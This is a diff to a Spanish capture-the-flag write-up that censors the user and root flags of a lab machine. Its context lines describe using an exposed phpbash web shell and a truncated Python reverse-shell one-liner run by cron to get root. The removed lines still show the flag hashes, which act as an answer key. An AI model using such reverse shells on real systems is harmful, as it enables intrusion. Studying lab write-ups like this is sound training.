@@ -125,7 +125,7 @@ Al entrar en `http://10.129.78.225/dev/` encontramos `phpbash.php`, la herramien
 Navegando con ella llegamos a `/home/arrexel/user.txt`:
 
 ```
-FLAG arrexel -> d31b69773ae699b8a8989cd92bf934a5
+FLAG arrexel -> [censurada]
 ```
 
 La primera flag se obtiene sin necesidad de explotar nada más: el propio desarrollador dejó `/dev/` expuesto con su herramienta de pruebas.
@@ -190,7 +190,7 @@ echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STR
 Abrimos un segundo listener en el puerto 4445 y esperamos a que el cron ejecute el script. Al poco tiempo recibimos una shell como **root**, con la que navegamos a `/root/root.txt`:
 
 ```
-Flag root -> ccf156f4bdeb07a6ee1c61cc8561adcf
+Flag root -> [censurada]
 ```
 
 ---
@@ -214,5 +214,5 @@ No exponer herramientas de pruebas como `phpbash` en un directorio accesible: de
 ---
 
 **Flags:**
-- `arrexel/user.txt` → `d31b69773ae699b8a8989cd92bf934a5`
-- `root.txt` → `ccf156f4bdeb07a6ee1c61cc8561adcf`
+- `arrexel/user.txt` → `[censurada]`
+- `root.txt` → `[censurada]`
